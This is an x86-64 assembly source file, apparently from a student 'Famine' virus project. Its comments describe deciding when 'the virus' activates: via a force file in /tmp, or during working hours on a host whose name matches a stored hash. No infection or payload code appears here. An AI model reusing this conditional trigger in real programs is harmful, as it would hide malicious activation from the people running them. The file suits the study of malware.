; **************************************************************************** ;
;                                                                              ;
;    control.asm                                         :::      ::::::::    ;
;                                                       :+:      :+:    :+:    ;
;    By: sdestann <sdestann@student.42perpignan.    +#+  +:+       +#+         ;
;                                                 +#+#+#+#+#+   +#+            ;
;    Created: 2025/10/22 21:45:00 by sdestann          #+#    #+#              ;
;    Updated: 2025/10/22 21:45:00 by sdestann         ###   ########.fr        ;
; **************************************************************************** ;

BITS 64

%include "include/macros.inc"
%include "include/structures.inc"

extern current_file

global should_activate
global trigger_config

section .data
    ; Configuration du trigger
    trigger_config:
        .hostname_hash:     dq 0x52B0382AF267BC1A  ; Hash attendu du hostname
        .time_start:        db 9                    ; Heure de début (9h)
        .time_end:          db 17                   ; Heure de fin (17h)
        .force_file_path:   db "/tmp/famine_force", 0  ; Fichier de force
        .hostname_path:    db "/proc/sys/kernel/hostname", 0
        .hostname_path_len: equ $ - .hostname_path - 1

section .text

; =============================================================================
; should_activate: Détermine si le virus doit s'activer
; Params: aucun
; Returns: rax = 1 si activation, 0 si pas d'activation
; Side effects: lit /proc/sys/kernel/hostname et vérifie l'heure
; =============================================================================
should_activate:
    push rbp
    mov rbp, rsp
    sub rsp, 64
    
    ; Vérifier d'abord si le fichier de force existe
    call check_force_file
    test rax, rax
    jnz .activate
    
    ; Vérifier l'heure actuelle
    call check_time_condition
    test rax, rax
    jz .no_activate
    
    ; Vérifier le hash du hostname
    call check_hostname_hash
    test rax, rax
    jz .no_activate
    
.activate:
    mov rax, 1
    jmp .done
    
.no_activate:
    xor rax, rax
    
.done:
    leave
    ret

; =============================================================================
; check_force_file: Vérifie l'existence du fichier /tmp/famine_force
; Params: aucun
; Returns: rax = 1 si le fichier existe, 0 sinon
; Side effects: essaie d'ouvrir le fichier
; =============================================================================
check_force_file:
    push rbp
    mov rbp, rsp
    
    ; Ouvrir le fichier de force
    mov rdi, trigger_config.force_file_path
    mov rsi, O_RDONLY
    mov rax, SYS_OPEN
    syscall
    
    cmp rax, 0
    jl .not_found
    
    ; Fermer le fichier
    mov rdi, rax
    mov rax, SYS_CLOSE
    syscall
    
    mov rax, 1
    jmp .done
    
.not_found:
    xor rax, rax
    
.done:
    leave
    ret

; =============================================================================
; check_time_condition: Vérifie si l'heure actuelle est dans la plage autorisée
; Params: aucun
; Returns: rax = 1 si dans la plage, 0 sinon
; Side effects: appelle gettimeofday
; =============================================================================
check_time_condition:
    push rbp
    mov rbp, rsp
    sub rsp, 16
    
    ; gettimeofday(&tv, NULL)
    lea rdi, [rbp - 16]  ; struct timeval
    xor rsi, rsi         ; timezone (deprecated)
    mov rax, SYS_GETTIMEOFDAY
    syscall
    
    test rax, rax
    jnz .error
    
    ; Extraire l'heure (tv.tv_sec % 86400) / 3600
    mov rax, [rbp - 16]  ; tv.tv_sec
    mov rbx, 86400       ; secondes par jour
    xor rdx, rdx
    div rbx              ; rax = jours, rdx = secondes dans le jour
    
    mov rax, rdx
    mov rbx, 3600        ; secondes par heure
    xor rdx, rdx
    div rbx              ; rax = heure actuelle
    
    ; Vérifier si l'heure est dans la plage [time_start, time_end]
    movzx rbx, byte [trigger_config.time_start]
    movzx rcx, byte [trigger_config.time_end]
    
    cmp rax, rbx
    jl .out_of_range
    cmp rax, rcx
    jg .out_of_range
    
    mov rax, 1
    jmp .done
    
.out_of_range:
    xor rax, rax
    jmp .done
    
.error:
    xor rax, rax
    
.done:
    leave
    ret

; =============================================================================
; check_hostname_hash: Vérifie le hash du hostname
; Params: aucun
; Returns: rax = 1 si hash correspond, 0 sinon
; Side effects: lit /proc/sys/kernel/hostname
; =============================================================================
check_hostname_hash:
    push rbp
    mov rbp, rsp
    sub rsp, 256
    
    ; Ouvrir /proc/sys/kernel/hostname
    mov rdi, trigger_config.hostname_path
    mov rsi, O_RDONLY
    mov rax, SYS_OPEN
    syscall
    
    cmp rax, 0
    jl .error
    
    mov r12, rax  ; sauvegarder le fd
    
    ; Lire le hostname
    mov rdi, r12
    lea rsi, [rbp - 256]
    mov rdx, 255
    mov rax, SYS_READ
    syscall
    
    cmp rax, 0
    jle .close_and_error
    
    ; Fermer le fichier
    mov rdi, r12
    mov rax, SYS_CLOSE
    syscall
    
    ; Calculer le hash du hostname
    lea rdi, [rbp - 256]
    call calculate_hash
    
    ; Comparer avec le hash attendu
    cmp rax, [trigger_config.hostname_hash]
    jne .no_match
    
    mov rax, 1
    jmp .done
    
.no_match:
    xor rax, rax
    jmp .done
    
.close_and_error:
    mov rdi, r12
    mov rax, SYS_CLOSE
    syscall
    
.error:
    xor rax, rax
    
.done:
    leave
    ret


; =============================================================================
; calculate_hash: Calcule un hash simple d'une chaîne
; Params: rdi = pointeur vers la chaîne
; Returns: rax = hash calculé
; Side effects: aucun
; =============================================================================
calculate_hash:
    push rbp
    mov rbp, rsp
    push rbx
    push rcx
    
    xor rax, rax  ; hash = 0
    xor rbx, rbx  ; compteur
    
.loop:
    movzx rcx, byte [rdi + rbx]
    test rcx, rcx
    jz .done
    
    ; hash = hash * 31 + char
    mov rdx, rax
    shl rdx, 5    ; * 32
    sub rdx, rax  ; * 31
    add rdx, rcx
    mov rax, rdx
    
    inc rbx
    jmp .loop
    
.done:
    pop rcx
    pop rbx
    leave
    ret

; =============================================================================
; strncmp: Compare deux chaînes sur n caractères
; Params: rdi = str1, rsi = str2
; Returns: rax = 0 si égales, non-zero sinon
; Side effects: aucun
; =============================================================================
strncmp:
    push rbp
    mov rbp, rsp
    push rbx
    push rcx
    
    xor rbx, rbx  ; compteur
    
.loop:
    movzx rax, byte [rdi + rbx]
    movzx rcx, byte [rsi + rbx]
    
    cmp rax, rcx
    jne .not_equal
    
    test rax, rax
    jz .equal
    
    inc rbx
    jmp .loop
    
.equal:
    xor rax, rax
    jmp .done
    
.not_equal:
    sub rax, rcx
    
.done:
    pop rcx
    pop rbx
    leave
    ret

; =============================================================================
; strlen: Calcule la longueur d'une chaîne
; Params: rdi = pointeur vers la chaîne
; Returns: rax = longueur
; Side effects: aucun
; =============================================================================
strlen:
    push rbp
    mov rbp, rsp
    push rcx
    
    xor rcx, rcx
    
.loop:
    cmp byte [rdi + rcx], 0
    je .done
    inc rcx
    jmp .loop
    
.done:
    mov rax, rcx
    pop rcx
    leave
    ret
